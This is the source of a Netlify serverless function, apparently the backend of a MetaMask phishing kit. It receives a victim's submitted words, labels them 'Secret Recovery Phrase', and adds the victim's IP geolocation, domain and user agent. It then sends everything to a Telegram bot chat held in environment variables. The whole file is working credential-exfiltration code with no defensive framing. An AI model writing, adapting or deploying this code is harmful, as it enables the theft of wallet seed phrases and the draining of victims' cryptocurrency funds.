// netlify/functions/sendTelegram.js
const fetch = require('node-fetch');

exports.handler = async (event, context) => {
  // Handle CORS preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*', // Adjust as needed
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
      body: '',
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers: {
        'Access-Control-Allow-Origin': '*', // Adjust as needed
      },
      body: 'Method Not Allowed',
    };
  }

  try {
    const { words } = JSON.parse(event.body);

    if (!words || !Array.isArray(words)) {
      return {
        statusCode: 400,
        headers: {
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({ message: 'Invalid payload.' }),
      };
    }

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !CHAT_ID) {
      return {
        statusCode: 500,
        headers: {
          'Access-Control-Allow-Origin': '*',
        },
        body: JSON.stringify({ message: 'Server configuration error.' }),
      };
    }

    // Extract Client's IP Address
    let clientIp = '';
    const headers = event.headers;

    if (headers['x-forwarded-for']) {
      // X-Forwarded-For may contain multiple IPs, the first one is the client's
      clientIp = headers['x-forwarded-for'].split(',')[0].trim();
    } else if (headers['client-ip']) {
      clientIp = headers['client-ip'];
    } else {
      clientIp = 'Unknown';
    }

    // Validate the extracted IP
    const ipRegex = /^(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)$/;
    if (!ipRegex.test(clientIp)) {
      clientIp = 'Unknown';
    }

    // If client IP is unknown, you might choose to handle it differently
    // For this example, we'll proceed with 'Unknown' which may limit geolocation data

    // Fetch IP and Geolocation Data using the client's IP
    let ipData;
    if (clientIp !== 'Unknown') {
      // Using freegeoip.app with client's IP
      const ipGeoUrl = `https://freegeoip.app/json/${clientIp}`;
      const ipResponse = await fetch(ipGeoUrl);

      if (!ipResponse.ok) {
        throw new Error('Failed to fetch IP data.');
      }

      ipData = await ipResponse.json();
    } else {
      // Handle cases where IP is unknown or cannot be determined
      ipData = {
        country_name: 'Unknown',
        region_name: 'Unknown',
        city: 'Unknown',
        organization: 'Unknown',
        ip: 'Unknown',
      };
    }

    // Collect Additional Data
    const currentDate = new Date().toISOString().split('T')[0];
    const domain = event.headers.host || 'Unknown';
    const userAgent = event.headers['user-agent'] || 'Unknown';
    const liveStatus = 'ON'; // Adjust as needed

    // Format the Message
    const formattedMessage = `
====================
METAMASK
++++++++++++++++++++
${currentDate}
live: ${liveStatus}
domain: ${domain}
${ipData.country_name}|${ipData.region_name}|${ipData.city}|${ipData.organization}|${ipData.ip}
ip: ${ipData.ip}
ua: ${userAgent}
---------------------
Secret Recovery Phrase:
${words.join(' ')}
    `;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const payload = {
      chat_id: CHAT_ID,
      text: formattedMessage,
      parse_mode: 'Markdown',
    };

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    const telegramData = await telegramResponse.json();

    if (!telegramResponse.ok || !telegramData.ok) {
      throw new Error(telegramData.description || 'Telegram API error');
    }

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*', // Adjust as needed
      },
      body: JSON.stringify({ message: 'Message sent successfully.' }),
    };
  } catch (error) {
    console.error('Error in sendTelegram function:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*', // Adjust as needed
      },
      body: JSON.stringify({ message: error.message || 'Internal Server Error' }),
    };
  }
};
